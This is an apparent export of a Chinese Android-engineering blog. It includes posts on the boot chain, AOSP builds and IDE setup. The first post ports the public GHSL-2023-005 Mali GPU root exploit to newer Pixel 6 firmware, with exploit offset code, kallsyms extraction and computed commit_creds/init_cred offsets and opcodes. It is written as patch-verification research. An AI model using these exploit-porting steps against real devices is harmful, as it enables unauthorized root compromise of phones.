[{"title":"利用 Arm Mali GPU 驱动漏洞获取 root 权限","path":"/2024/05/12/gain-root-privilege-by-arm-mali-gpu-driver-vulnerability/","content":"背景最近有在看之前网上公布的关于 Pixel 系列手机关于 Arm Mali GPU 驱动的提权漏洞，想确认下新版本的固件是否已经修复该漏洞。本文并不是分析其实现原理和提供挖掘漏洞的思路，而是利用现有的 PoC 代码适配新版本的固件并尝试验证漏洞是否还存在。 GHSL-2023-005这个是比较早的在 Pixle 6 上有验证过可提权的 PoC。原理方面见 Rooting with root cause: finding a variant of a Project Zero bug 函数 select_offset 做了部分的固件版本匹配适配。 12345678910111213141516171819202122232425262728293031#define AVC_DENY_2301 0x8ba710#define SEL_READ_ENFORCE_2301 0x8cdfd4...void select_offset() &#123; char fingerprint[256]; int len = __system_property_get(&quot;ro.build.fingerprint&quot;, fingerprint); LOG(&quot;fingerprint: %s &quot;, fingerprint); if (!strcmp(fingerprint, &quot;google/oriole/oriole:13/TP1A.221105.002/9080065:user/release-keys&quot;)) &#123; avc_deny = AVC_DENY_2211; sel_read_enforce = SEL_READ_ENFORCE_2211; fixup_root_shell(INIT_CRED_2211, COMMIT_CREDS_2211, SEL_READ_ENFORCE_2211, ADD_INIT_2211, ADD_COMMIT_2211, &amp;(root_code[0])); return; &#125; if (!strcmp(fingerprint, &quot;google/oriole/oriole:13/TQ1A.221205.011/9244662:user/release-keys&quot;)) &#123; avc_deny = AVC_DENY_2212; sel_read_enforce = SEL_READ_ENFORCE_2212; fixup_root_shell(INIT_CRED_2212, COMMIT_CREDS_2212, SEL_READ_ENFORCE_2212, ADD_INIT_2212, ADD_COMMIT_2212, &amp;(root_code[0])); return; &#125; if (!strcmp(fingerprint, &quot;google/oriole/oriole:13/TQ1A.230105.002/9325679:user/release-keys&quot;)) &#123; avc_deny = AVC_DENY_2301; sel_read_enforce = SEL_READ_ENFORCE_2301; fixup_root_shell(INIT_CRED_2301, COMMIT_CREDS_2301, SEL_READ_ENFORCE_2301, ADD_INIT_2301, ADD_COMMIT_2301, &amp;(root_code[0])); return; &#125; err(1, &quot;unable to match build id &quot;);&#125; kallsyms那么问题来了，关于如 AVC_DENY_2301 的值是如何来的。 需要先了解下 kallsyms kallsyms.c: in-kernel printing of symbolic oopses and stack traces. 在 Linux 内核中，kallsyms 是一个符号表，它包含了内核中所有的符号信息，包括函数、变量、常量等等。 如下的部分内容可从 kallsyms 导出，其对应关系如下 AVC_DENY_X avc_denied SEL_READ_ENFORCE_X sel_read_enforce INIT_CRED_X init_cred COMMIT_CREDS_X commit_creds 获取 kallsyms 符号表有两种方式 通过 cat 命令获取，但是其首先需要有 root 权限，而我们要做的就是先提权获取 root 权限。 1234567891011oriole:/ $ cat /proc/kallsyms cat: /proc/kallsyms: Permission denied1|oriole:/ $ suoriole:/ # cat /proc/kallsyms0000000000000000 t acpm_ipc_debugfs_init\t[gs_acpm]0000000000000000 t channel_init\t[gs_acpm]...oriole:/ # echo 0 &gt; /proc/sys/kernel/kptr_restrictoriole:/ # cat /proc/kallsymsffffffd7693f0b28 r exynos5433_bank_type_alive\t[pinctrl_samsung_core]ffffffd7693f0b34 r exynos5433_bank_type_off\t[pinctrl_samsung_core] 通过解析官方 boot 镜像提取 kernel 进行分析 首先去官网下载对应自己 Pixel 机型的镜像文件。比如我手上有 Piexl 6，我下载了 image-oriole-tq2a.230505.002 版本，后续有验证该版本已经无法通过上述漏洞进行提权了。 从镜像固件里面提取 boot.img，然后解包提取 kernel 123456789$ ~/AOSP/14.0.0_r29/out/host/linux-x86/bin/unpack_bootimg --boot_img boot.img$ ls -l out/total 24376-rw-rw-r-- 1 shumxin shumxin 24959956 May 12 14:58 kernel-rw-rw-r-- 1 shumxin shumxin 0 May 12 14:58 ramdisk$ file out/kernel kernel: LZ4 compressed data (v0.1-v0.9) 通过 file 查看提取的 kernel 还不是一个 elf。暂时无法直接获取 kallsyms 符号表。 这里需要用到 vmlinux-to-elf进行提取。 12$ $HOME/.venv/bin/vmlinux-to-elf out/kernel kernel-vm$ $HOME/.venv/bin/kallsyms-finder kernel-vm &gt; kallsyms.txt 123456789101112131415161718[+] Version string: Linux version 5.10.149-android13-4-00003-gebdbc9fbe2e2-ab9664856 (build-user@build-host) (Android (8508608, based on r450784e) clang version 14.0.7 (https://android.googlesource.com/toolchain/llvm-project 4c603efb0cca074e9238af8b4106c30add4418f6), LLD 14.0.7) #1 SMP PREEMPT Mon Feb 27 10:44:09 UTC 2023[+] Guessed architecture: aarch64 successfully in 2.87 seconds[+] Found kallsyms_token_table at file offset 0x022409a0[+] Found kallsyms_token_index at file offset 0x02240d40[+] Found kallsyms_markers at file offset 0x022400e8[+] Found kallsyms_names at file offset 0x02048828[+] Found kallsyms_num_syms at file offset 0x02048820[i] Negative offsets overall: 0 %[i] Null addresses overall: 0 %[+] Found kallsyms_offsets at file offset 0x01fbd780Symbol types =&gt; [&#x27;B&#x27;, &#x27;D&#x27;, &#x27;R&#x27;, &#x27;T&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;r&#x27;, &#x27;t&#x27;]ffffffc008000000 T _text...ffffffc0088bd17c t avc_deniedffffffc0088d0a64 t sel_read_enforceffffffc00aff1380 D init_credffffffc00817a618 T commit_creds 其中 _text 是 kernel 的起始虚拟地址。对应的换算关系如下。 123456789101112131415161718192021222324252627#define AVC_DENY_2301 0x8ba710 // ffffffc0108ba710 - ffffffc010000000#define SEL_READ_ENFORCE_2301 0x8cdfd4 // ffffffc0108cdfd4#define INIT_CRED_2301 0x2fd1418 // ffffffc012fd1418#define COMMIT_CREDS_2301 0x177ee4 // ffffffc010177ee4#define ADD_INIT_2301 0x91106000 // add x0, x0, #0x418#define ADD_COMMIT_2301 0x913b9108 // add x8, x8, #0xee4// TQ2A.230505.002#define AVC_DENY_2305 0x8bd17c // ffffffc0088bd17c - ffffffc008000000#define SEL_READ_ENFORCE_2305 0x8d0a64 // ffffffc0088d0a64 - ffffffc008000000#define INIT_CRED_2305 0x2ff1380 // ffffffc00aff1380 - ffffffc008000000#define COMMIT_CREDS_2305 0x17a618 // ffffffc00817a618 - ffffffc008000000// 其中 #0x380 取 INIT_CRED_2305 后三个#define ADD_INIT_2305 0x910e0000 // add x0, x0, #0x380// 其中 #0x618 取 COMMIT_CREDS 后三位#define ADD_COMMIT_2305 0x91186108 // add x8, x8, #0x618 关于 arm 指令集操作码可通过 Online HEX to ARM Converter 进行转化获取 16 进制数据。 参考 [1] Exploit for GHSL-2023-005 [2] [CVE-2023-6241](https://github.com/s1204IT/CVE-2023-6241https://jrgraphix.net/man/K/kallsyms) [3] Potential ARM Mali GPU based root (FireHD 8th -12th gen affected)","categories":["reverse"]},{"title":"Android 系统启动前","path":"/2024/05/01/before-android-boot-process/","content":"背景过去看了一些大牛关于 Android Framework 的相关文章，一直想自己梳理相关的内容。计划 Framework 开篇是 【Android 系统启动】，但是想想还是先整理一篇关于安卓系统启动前的文章。 启动流程 Upon power up, hardware usually starts uninitialized. To continue booting, the system may need to read a bootloader from some peripheral device. It is often easier to implement routines for reading from external storage devices in software than in hardware. A boot ROM provides a place to store this initial loading code, at a fixed location immediately available to the processor when execution starts.。 上电后，硬件通常以未初始化的方式启动。要继续引导，系统可能需要从某些外围设备读取引导加载程序。在软件中实现从外部存储设备读取的例程通常比在硬件中更容易。引导 ROM 提供了一个存储此初始加载代码的位置，该位置位于执行开始时处理器立即可用的固定位置。 Bootloader(BL)早期的 Android 设备并未对 boot.img，system.img 等进行可靠性校验，用户可通过获取临时 root 权限后对系统进行修改。4.4 时期安卓引入了 Verified Boot，但是其也依赖前面阶段的校验。整个校验链路中某个环节被攻击都会无法保证后面阶段的可靠性，而 BL 正是这个链路中至关重要的一环。 目前的市面上的安卓设备通常有多个引导加载程序阶段，其中一个引导加载程序启动另一个引导加载程序，阶段中的每个引导加载程序都会执行特定的功能，并且每个引导加载程序都由前一个引导加载程序（例如，主引导加载程序 （PBL） →辅助引导加载程序 （SBL） → …） 进行验证。依此类推，直到内核加载。 Primary Bootloader(PBL)信任链中的第一个引导加载程序就是 PBL，存储在不可变的只读存储器中，其可确保无法被物理修改，因此是受信任的。 Secondary Bootloader(SBL)SBL 是紧接 PBL 后面的引导加载程序，PBL 校验 SBL 可靠后会对其进行加载。 对于使用高通芯片的安卓设备，在较新的处理器上，SBL 被 XBL （eXtensible Boot Loader）取代。 SBL 负责芯片驱动及充电等核心应用功能等初始化 Applications Bootloader(ABL)ABL 包括芯片无关的应用如 fastboot，并接收 XBL 一些初始化的信息并将其传递至 kernel。同样 ABL 会验证 boot 或者 recovery 映像的真实性。 KernelAndroid 内核是基于 Linux 内核的修改版本，内核启动过程中会执行 init 可执行文件后创建 init 进程，init 会通过解析 init.rc 来启动 zygote 服务，而 zygote 又会启动会创建 system_server 进程。Android 的系统启动则是从 Android 内核启动开始。 参考 [1] Boot ROM [2] Booting process of Android devices [3] Qualcomm’s Chain of Trust [4] Secure Boot and Image Authentication [5] Qualcomm® Secure boot Prevents malicious software from loading during the system start-up process of Inforce platforms [6] Analysis of Qualcomm Secure Boot Chains [7] Emulating the Android Boot Process [8] Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection [9] Bootloader overview [10] Verified Boot [11] Android Boot Process [12] Secure Boot 2.2 安全启动 [13] 浅谈 Android 的安全启动和完整性保护 [14] 当我们谈论解锁 BootLoader 时，我们在谈论什么？ [15] Android【开机启动】流程","categories":["android"]},{"title":"使用 ASfP 阅读和调试 AOSP","path":"/2024/04/30/get-started-with-ASfP/","content":"背景在 MacBook Pro M3 Max 上编译 AOSP 的文章中提到了使用 OrbStack 进行 AOSP 项目编译，但是对于代码查看和调试不方便，用了 idea, vscode 的 remote 方式都有些问题，还是选用官方推荐的 Ubuntu 配合 ASfP 的方式更合适。 设备硬盘 2 TB，源码加编译产物使用了差不多 900GB 多 CPU Intel® Core™ i5 processor 14600KF 24M Cache GPU INNO3D GEFORCE RTX 4070 SUPER 曜夜OC RAM 芝奇 幻锋戟 32GB * 2 DDR5 6400 HDD 致态 TiPlus 7100 2TB NVMe M.2 PCIe4.0 编译配置针对 Pixel 6 编译，考虑到节省磁盘空间，移除了部分非必要项目。 在 .repo 目录下新增 local_manifests 目录，添加需要移除的项目的配置。后续 repo sync 就不会同步对应移除项目的代码。 123$ mkdir -p .repo/local_manifests/$ touch .repo/local_manifests/device_clean.xml$ touch .repo/local_manifests/jdk_clean.xml 移除非 oriole(Pixel 6) 未使用到的其他 device 项目 device_clean.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest&gt; &lt;remove-project path=&quot;device/amlogic/yukawa&quot; name=&quot;device/amlogic/yukawa&quot; groups=&quot;device,yukawa,pdk&quot; /&gt; &lt;remove-project path=&quot;device/amlogic/yukawa-kernel&quot; name=&quot;device/amlogic/yukawa-kernel&quot; groups=&quot;device,yukawa,pdk&quot; /&gt; &lt;remove-project path=&quot;device/common&quot; name=&quot;device/common&quot; groups=&quot;pdk-cw-fs,pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/arm64&quot; name=&quot;device/generic/arm64&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/armv7-a-neon&quot; name=&quot;device/generic/armv7-a-neon&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/art&quot; name=&quot;device/generic/art&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/car&quot; name=&quot;device/generic/car&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/common&quot; name=&quot;device/generic/common&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/mini-emulator-arm64&quot; name=&quot;device/generic/mini-emulator-arm64&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/mini-emulator-armv7-a-neon&quot; name=&quot;device/generic/mini-emulator-armv7-a-neon&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/mini-emulator-x86&quot; name=&quot;device/generic/mini-emulator-x86&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/mini-emulator-x86_64&quot; name=&quot;device/generic/mini-emulator-x86_64&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/opengl-transport&quot; name=&quot;device/generic/opengl-transport&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/trusty&quot; name=&quot;device/generic/trusty&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/uml&quot; name=&quot;device/generic/uml&quot; groups=&quot;device,pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/x86&quot; name=&quot;device/generic/x86&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/x86_64&quot; name=&quot;device/generic/x86_64&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/generic/vulkan-cereal&quot; name=&quot;device/generic/vulkan-cereal&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/google/atv&quot; name=&quot;device/google/atv&quot; groups=&quot;device,broadcom_pdk,generic_fs,pdk&quot; /&gt; &lt;remove-project path=&quot;device/google/barbet&quot; name=&quot;device/google/barbet&quot; groups=&quot;device,barbet&quot; /&gt; &lt;remove-project path=&quot;device/google/barbet-sepolicy&quot; name=&quot;device/google/barbet-sepolicy&quot; groups=&quot;device,barbet&quot; /&gt; &lt;remove-project path=&quot;device/google/bluejay&quot; name=&quot;device/google/bluejay&quot; groups=&quot;device,bluejay&quot; /&gt; &lt;remove-project path=&quot;device/google/bluejay-sepolicy&quot; name=&quot;device/google/bluejay-sepolicy&quot; groups=&quot;device,bluejay&quot; /&gt; &lt;remove-project path=&quot;device/google/bluejay-kernel&quot; name=&quot;device/google/bluejay-kernel&quot; groups=&quot;device,bluejay&quot; /&gt; &lt;remove-project path=&quot;device/google/bramble&quot; name=&quot;device/google/bramble&quot; groups=&quot;device,bramble&quot; /&gt; &lt;remove-project path=&quot;device/google/bramble-sepolicy&quot; name=&quot;device/google/bramble-sepolicy&quot; groups=&quot;device,bramble&quot; /&gt; &lt;remove-project path=&quot;device/google/contexthub&quot; name=&quot;device/google/contexthub&quot; groups=&quot;device,pdk&quot; /&gt; &lt;remove-project path=&quot;device/google/coral&quot; name=&quot;device/google/coral&quot; groups=&quot;device,coral,generic_fs&quot; /&gt; &lt;remove-project path=&quot;device/google/coral-kernel&quot; name=&quot;device/google/coral-kernel&quot; groups=&quot;device,coral,generic_fs&quot; /&gt; &lt;remove-project path=&quot;device/google/coral-sepolicy&quot; name=&quot;device/google/coral-sepolicy&quot; groups=&quot;device,coral,generic_fs&quot; /&gt; &lt;remove-project path=&quot;device/google/felix&quot; name=&quot;device/google/felix&quot; groups=&quot;device,felix&quot; /&gt; &lt;remove-project path=&quot;device/google/felix-sepolicy&quot; name=&quot;device/google/felix-sepolicy&quot; groups=&quot;device,felix&quot; /&gt; &lt;remove-project path=&quot;device/google/felix-kernel&quot; name=&quot;device/google/felix-kernel&quot; groups=&quot;device,felix&quot; /&gt; &lt;remove-project path=&quot;device/google/gs201&quot; name=&quot;device/google/gs201&quot; groups=&quot;device,cloudripper&quot; /&gt; &lt;remove-project path=&quot;device/google/gs201-sepolicy&quot; name=&quot;device/google/gs201-sepolicy&quot; groups=&quot;device,cloudripper&quot; /&gt; &lt;remove-project path=&quot;device/google/lynx&quot; name=&quot;device/google/lynx&quot; groups=&quot;device,lynx&quot; /&gt; &lt;remove-project path=&quot;device/google/lynx-sepolicy&quot; name=&quot;device/google/lynx-sepolicy&quot; groups=&quot;device,lynx&quot; /&gt; &lt;remove-project path=&quot;device/google/lynx-kernel&quot; name=&quot;device/google/lynx-kernel&quot; groups=&quot;device,lynx&quot; /&gt; &lt;remove-project path=&quot;device/google/pantah&quot; name=&quot;device/google/pantah&quot; groups=&quot;device,cloudripper&quot; /&gt; &lt;remove-project path=&quot;device/google/pantah-sepolicy&quot; name=&quot;device/google/pantah-sepolicy&quot; groups=&quot;device,cloudripper&quot; /&gt; &lt;remove-project path=&quot;device/google/pantah-kernel&quot; name=&quot;device/google/pantah-kernel&quot; groups=&quot;device,cloudripper&quot; /&gt; &lt;remove-project path=&quot;device/google/redbull&quot; name=&quot;device/google/redbull&quot; groups=&quot;device,redbull&quot; /&gt; &lt;remove-project path=&quot;device/google/redbull-kernel&quot; name=&quot;device/google/redbull-kernel&quot; groups=&quot;device,bramble,redfin&quot; /&gt; &lt;remove-project path=&quot;device/google/redbull-sepolicy&quot; name=&quot;device/google/redbull-sepolicy&quot; groups=&quot;device,redbull&quot; /&gt; &lt;remove-project path=&quot;device/google/redfin&quot; name=&quot;device/google/redfin&quot; groups=&quot;device,redfin&quot; /&gt; &lt;remove-project path=&quot;device/google/redfin-sepolicy&quot; name=&quot;device/google/redfin-sepolicy&quot; groups=&quot;device,redfin&quot; /&gt; &lt;remove-project path=&quot;device/google/tangorpro&quot; name=&quot;device/google/tangorpro&quot; groups=&quot;device,tangorpro&quot; /&gt; &lt;remove-project path=&quot;device/google/tangorpro-sepolicy&quot; name=&quot;device/google/tangorpro-sepolicy&quot; groups=&quot;device,tangorpro&quot; /&gt; &lt;remove-project path=&quot;device/google/tangorpro-kernel&quot; name=&quot;device/google/tangorpro-kernel&quot; groups=&quot;device,tangorpro&quot; /&gt; &lt;remove-project path=&quot;device/google/shusky&quot; name=&quot;device/google/shusky&quot; groups=&quot;device,ripcurrent&quot; /&gt; &lt;remove-project path=&quot;device/google/shusky-kernel&quot; name=&quot;device/google/shusky-kernel&quot; groups=&quot;device,ripcurrent&quot; /&gt; &lt;remove-project path=&quot;device/google/shusky-sepolicy&quot; name=&quot;device/google/shusky-sepolicy&quot; groups=&quot;device,ripcurrent&quot; /&gt; &lt;remove-project path=&quot;device/google/sunfish&quot; name=&quot;device/google/sunfish&quot; groups=&quot;device,sunfish&quot; /&gt; &lt;remove-project path=&quot;device/google/sunfish-kernel&quot; name=&quot;device/google/sunfish-kernel&quot; groups=&quot;device,sunfish&quot; /&gt; &lt;remove-project path=&quot;device/google/sunfish-sepolicy&quot; name=&quot;device/google/sunfish-sepolicy&quot; groups=&quot;device,sunfish&quot; /&gt; &lt;remove-project path=&quot;device/google/trout&quot; name=&quot;device/google/trout&quot; groups=&quot;device,trout,gull,pdk&quot; /&gt; &lt;remove-project path=&quot;device/google/vrservices&quot; name=&quot;device/google/vrservices&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/google/zuma&quot; name=&quot;device/google/zuma&quot; groups=&quot;device,ripcurrent&quot; /&gt; &lt;remove-project path=&quot;device/google/zuma-sepolicy&quot; name=&quot;device/google/zuma-sepolicy&quot; groups=&quot;device,ripcurrent&quot; /&gt; &lt;remove-project path=&quot;device/google_car&quot; name=&quot;device/google_car&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/dragonboard&quot; name=&quot;device/linaro/dragonboard&quot; groups=&quot;device,dragonboard,pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/dragonboard-kernel&quot; name=&quot;device/linaro/dragonboard-kernel&quot; groups=&quot;device,dragonboard,pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/hikey&quot; name=&quot;device/linaro/hikey&quot; groups=&quot;device,hikey,pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/hikey-kernel&quot; name=&quot;device/linaro/hikey-kernel&quot; groups=&quot;device,hikey,pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/poplar&quot; name=&quot;device/linaro/poplar&quot; groups=&quot;device,poplar,pdk&quot; /&gt; &lt;remove-project path=&quot;device/linaro/poplar-kernel&quot; name=&quot;device/linaro/poplar-kernel&quot; groups=&quot;device,poplar,pdk&quot; /&gt;&lt;/manifest&gt; 移除部分 jdk jdk_clean.xml 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest&gt; &lt;remove-project path=&quot;prebuilts/jdk/jdk11&quot; name=&quot;platform/prebuilts/jdk/jdk11&quot; groups=&quot;pdk&quot; /&gt; &lt;remove-project path=&quot;prebuilts/jdk/jdk9&quot; name=&quot;platform/prebuilts/jdk/jdk9&quot; groups=&quot;pdk&quot; /&gt;&lt;/manifest&gt; 耗时其中 -j 指定了 12，其他任务并行执行电脑也不感觉到卡顿。耗时 1小时 10 分钟完成。 1$ make otapackage -j12 WITH_DEXPREOPT=false 123452024-05-01 10:26:01 - common.py - INFO : Running: &quot;java -Xmx4096m -Djava.library.path=out/host/linux-x86/lib64 -jar out/host/linux-x86/framework/signapk.jar -w build/make/target/product/security/testkey.x509.pem build/make/target/product/security/testkey.pk8 /home/shumxin/AOSP/14.0.0_r29/out/soong/.temp/tmpsmayeaza.zip out/target/product/oriole/aosp_oriole-ota.zip&quot;2024-05-01 10:26:03 - ota_from_target_files.py - INFO : done.#### build completed successfully (01:10:17 (hh:mm:ss)) #### 调试导入 ASfP 在 android 14 上如果编译的固件类型是 userdebug，发现无法 attach process 进行 debug。 官方 commit 如下 123456789101112131415161718192021222324252627282930313233diff --git a/core/java/com/android/internal/os/Zygote.java b/core/java/com/android/internal/os/Zygote.javaindex b1e7d15..deafd19 100644--- a/core/java/com/android/internal/os/Zygote.java+++ b/core/java/com/android/internal/os/Zygote.java@@ -1001,16 +1001,24 @@ &#125; /**+ * This will enable jdwp by default for all apps. It is OK to cache this property+ * because we expect to reboot the system whenever this property changes+ */+ private static final boolean ENABLE_JDWP = SystemProperties.get(+ &quot;persist.debug.dalvik.vm.jdwp.enabled&quot;).equals(&quot;1&quot;);++ /** * Applies debugger system properties to the zygote arguments. *- * If &quot;ro.debuggable&quot; is &quot;1&quot;, all apps are debuggable. Otherwise,- * the debugger state is specified via the &quot;--enable-jdwp&quot; flag- * in the spawn request.+ * For eng builds all apps are debuggable. On userdebug and user builds+ * if persist.debuggable.dalvik.vm.jdwp.enabled is 1 all apps are+ * debuggable. Otherwise, the debugger state is specified via the+ * &quot;--enable-jdwp&quot; flag in the spawn request. * * @param args non-null; zygote spawner args */ static void applyDebuggerSystemProperty(ZygoteArguments args) &#123;- if (RoSystemProperties.DEBUGGABLE) &#123;+ if (Build.IS_ENG || ENABLE_JDWP) &#123; args.mRuntimeFlags |= Zygote.DEBUG_ENABLE_JDWP; &#125; &#125; 通过如下配置可开启 debug 进行应用调试 123$ adb root$ adb shell setprop persist.debug.dalvik.vm.jdwp.enabled 1$ adb reboot 参考 [1] Android Studio for Platform [2] Android Local Manifests机制的使用实践 [3] 使用 ASfP 搭建 Android Framwork 开发调试阅读环境","categories":["android"]},{"title":"MacBook Pro M3 Max 上编译 AOSP","path":"/2024/04/05/build-aosp-in-mackbook-pro-m3-max/","content":"背景 自 2021 年 6 月 22 日起，我们不再支持在 Mac OS X 上构建新版 Android 平台。不过，旧版 Android 仍可在 Mac 上构建。 所以目前在 Mac 上通常使用支持创建和使用 Linux® 容器的应用进行相应环境搭建，如 Docker 创建 Ubuntu 环境后同步 AOSP 源码进行构建。本文使用了 OrbStack OrbStack is a fast, light, and simple way to run containers and Linux machines on macOS. It’s a supercharged alternative to Docker Desktop and WSL, all in one easy-to-use app. 环境搭建和产物构建创建 Ubuntu查看 OrbStack 官方文档以及考虑到 arm 架构的 Ubuntu 编译可能存在未知问题，所以还是选择创建了 amd64 的 Ubuntu 环境 On Apple Silicon, OrbStack uses Rosetta to run Linux machines with Intel (x86_64&#x2F;amd64) binaries. This is much faster than emulation with QEMU or UTM, seamlessly providing near-native performance. 1$ orb create --arch amd64 ubuntu new-ubuntu 12345$ uname -aLinux new-ubuntu 6.7.11-orbstack-00143-ge6b82e26cd22 #1 SMP Sat Mar 30 12:20:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/issueUbuntu 23.10 \\l 安装相关依赖做了如下变动 git-core -&gt; git libncurses5 -&gt; libncurses5-dev 增加了 rsync，在后续编译过程中会需要 1$ sudo apt-get install git gnupg flex bison build-essential zip curl zlib1g-dev libc6-dev-i386 libncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig rsync 同步源码1234$ mkdir ~/bin$ PATH=~/bin:$PATH$ curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo$ chmod a+x ~/bin/repo 我使用清华镜像源进行了代码同步，指定了 android-14.0.0_r29 tag 12$ repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-14.0.0_r29$ repo sync 同步过程中遇到了如下错误 1error: Entry &#x27;docs/release-process.md&#x27; not uptodate. Cannot merge. 则需要执行 12$ cd .repo/repo$ git pull 如果编译用于真机的固件则需要下载对应官方提供的驱动程序二进制文件。比如我手上有个 Pixel 6 设备，则需要下载对应的文件用于后续的编译。在前面指定的 tag 标签的时候，官方对应 tag 有相应的 build id。如 android-14.0.0_r29 对应的是 AP1A.240305.019.A1 二进制文件压缩包下载下来后需要解压并执行释放相关内容 12$ tar -xf google_devices-oriole-ap1a.240305.019.a1-8e8e1205.tgz$ ./extract-google_devices-oriole.sh 编译12$ source build/envsetup.sh$ lunch 执行 lunch 命令后会卡住，通过 top 命令查看 nsjail 进程 100% CPU 给 OrbStack 提了 issue 后很久没回复就谷歌了一番，看到有博主提供了最简单的重命名方案可解决问题。 1$ mv prebuilts/build-tools/linux-x86/bin/nsjail prebuilts/build-tools/linux-x86/bin/nsjail.old 再次执行 lunch 后输入 aosp_oriole-trunk_staging-userdebug 1234567891011121314151617$ lunchYou&#x27;re building on LinuxWarning: Cannot display lunch menu.Note: You can invoke lunch with an explicit target: usage: lunch [target]Which would you like? [aosp_arm-trunk_staging-eng]Pick from common choices above (e.g. 13) or specify your own (e.g. aosp_barbet-trunk_staging-eng): aosp_oriole-trunk_staging-userdebug21:53:44 Build sandboxing disabled due to nsjail error.In file included from build/make/core/config.mk:389:In file included from build/make/core/envsetup.mk:51:build/make/core/release_config.mk:109: error: No release config found for TARGET_RELEASE: trunk_staging. Available releases are: ap1a.21:53:44 dumpvars failed with: exit status 1 输入 aosp_oriole-trunk_staging-userdebug 是源于 device/google/raviole/AndroidProducts.mk 中有相关配置。未深究该问题，按 Available releases are: ap1a. 提示替换 aosp_oriole-ap1a-userdebug 123456789101112131415161718192021222324Build sandboxing disabled due to nsjail error.============================================PLATFORM_VERSION_CODENAME=RELPLATFORM_VERSION=14PRODUCT_INCLUDE_TAGS=com.android.mainline mainline_module_prebuilt_nightlyTARGET_PRODUCT=aosp_orioleTARGET_BUILD_VARIANT=userdebugTARGET_ARCH=arm64TARGET_ARCH_VARIANT=armv8-2aTARGET_CPU_VARIANT=cortex-a55TARGET_2ND_ARCH=armTARGET_2ND_ARCH_VARIANT=armv8-aTARGET_2ND_CPU_VARIANT=genericHOST_OS=linuxHOST_OS_EXTRA=Linux-6.7.11-orbstack-00143-ge6b82e26cd22-x86_64-Ubuntu-23.10HOST_CROSS_OS=windowsBUILD_ID=AP1A.240305.019.A1OUT_DIR=out============================================Want FASTER LOCAL BUILDS? Use -eng instead of -userdebug (however for performance benchmarking continue to use userdebug)Hint: next time you can simply run &#x27;lunch aosp_oriole-ap1a-userdebug&#x27; 编译过程中会遇到 1ERROR: Dex2oat failed to compile a boot image.It is likely that the boot classpath is inconsistent.Rebuild with ART_BOOT_IMAGE_EXTRA_ARGS=&quot;--runtime-arg -verbose:verifier&quot; to see verification errors. 通过 WITH_DEXPREOPT=false 关闭 dex2oat 12345# 生成镜像文件$ m WITH_DEXPREOPT=false# 生成 ota.zip，我习惯于 recovery 模式下 adb sideload ota.zip 进行刷机$ make otapackage -j64 WITH_DEXPREOPT=false 刷机对应生成产物在 out/target/product/oriole/ 目录下 通过 orb pull 将产物拉到宿主机器环境下 1234$ orb pull /home/shumxin/AOSP/14.0.0_r29/out/target/product/oriole/boot.img$ orb pull /home/shumxin/AOSP/14.0.0_r29/out/target/product/oriole/dtbo.img$ orb pull /home/shumxin/AOSP/14.0.0_r29/out/target/product/oriole/vendor_boot.img$ orb pull /home/shumxin/AOSP/14.0.0_r29/out/target/product/oriole/aosp_oriole-ota.zip 刷写镜像 12345$ adb reboot booloader$ fastboot flash boot boot.img$ fastboot flash dtbo dtbo.img$ fastboot flash vendor_boot vendor_boot.img 在 fastboot 模式下选择进入 recovery 模式 选择 Wipe data/factory reset 清除数据 清除完成后选择 Apply update from ADB 1$ adb sideload aosp_oriole-ota.zip 参考 [1] Install LineageOS on Google Pixel 6 [2] macOS Sonoma(14.2.1)通过Docker编译Android 12.1源码过程总结(MacBook Pro 2023-Apple M2 Pro) [3] Android dex2oat build:ERROR: Dex2oat failed to compile a boot image [4] OrbStack: macOS 上的 WSL","categories":["android"]},{"title":"使用 CLion 查看 AOSP Native 代码","path":"/2021/08/13/opening-aosp-native-code-with-clion/","content":"背景Android Studio 对于 AOSP Native 部分的代码支持还不够完善，比如不支持跳转，无法查看引用以及无法通过 CTRL + F12 查看代码结构，给代码阅读造成了极大的不便。查看了谷歌官方文档，了解到可以通过配置 CMakeLists.txt 导入到 CLion 来进行阅读 Native 部分代码。 源码环境本人使用的是 ProtonAOSP，基于 AOSP 的三方 ROM 开源项目 生成 CLion 项目配置相关环境变量用于生成 CMakeLists.txt12$ export SOONG_GEN_CMAKEFILES=1$ export SOONG_GEN_CMAKEFILES_DEBUG=1 编译相关模块12$ source build/envsetup.sh$ mmm frameworks/av/media/mediaserver 